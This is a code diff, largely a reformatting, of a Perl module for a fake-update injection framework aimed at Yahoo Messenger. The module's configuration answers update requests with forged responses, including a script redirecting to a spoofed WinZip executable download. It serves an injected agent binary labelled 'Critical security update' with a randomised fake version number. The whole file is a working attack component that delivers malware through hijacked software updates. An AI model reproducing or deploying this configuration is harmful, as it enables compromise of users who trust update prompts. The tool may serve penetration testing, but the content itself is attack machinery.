@@ -27,62 +27,69 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'YahooMSN',
-    'version' => '1.0',
-    'appver'  => '< 11.0',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => 'download.yimg.com',
-    'request' => [
-		    {
-		    'req' => '(/updates/wnzpes.txt|/cgi\-bin/updateinfo.cgi)', #regex friendly #10.0
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => "<%VERSION%>\n\\n\\n<%DESCRIPTION%>",
-		    'parse' => 1,
-		    'file' => '',
-		    },
-		    {
-		    'req' => '/dnldwz.cgi', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '<html><script>window.location="http://update.winzip.com/winzipupdate<%RND1%>.exe"</script></html>',
-		    'parse' => 1,
-		    'file' => '',
-		    },
+my $base = {
+    'name'        => 'YahooMSN',
+    'version'     => '1.0',
+    'appver'      => '< 11.0',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => 'download.yimg.com',
+    'request'     => [
+        {   'req' => '(/updates/wnzpes.txt|/cgi\-bin/updateinfo.cgi)'
+            ,    #regex friendly #10.0
+            'type'   => 'string',    #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => 0,
+            'string' => "<%VERSION%>\n\\n\\n<%DESCRIPTION%>",
+            'parse'  => 1,
+            'file'   => '',
+        },
+        {   'req'    => '/dnldwz.cgi',    #regex friendly
+            'type'   => 'string',         #file|string|agent|install
+            'method' => '',               #any
+            'bin'    => 0,
+            'string' =>
+                '<html><script>window.location="http://update.winzip.com/winzipupdate<%RND1%>.exe"</script></html>',
+            'parse' => 1,
+            'file'  => '',
+        },
 
-		    {
-		    'req' => '.yim', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
+        {   'req'    => '.yim',           #regex friendly
+            'type'   => 'agent',          #file|string|agent|install
+            'method' => '',               #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.cab', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 0, 
-			    	  'desc' => 'Status'},
-		    'description'  => { 'val' => 'Critical security update',
-			    	  'desc' => 'Description display in the update'},
-                    'version'  => { 'val' => '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.cab', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 0,
+            'desc' => 'Status'
+        },
+        'description' => {
+            'val'  => 'Critical security update',
+            'desc' => 'Description display in the update'
+        },
+        'version' => {
+            'val' =>
+                '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
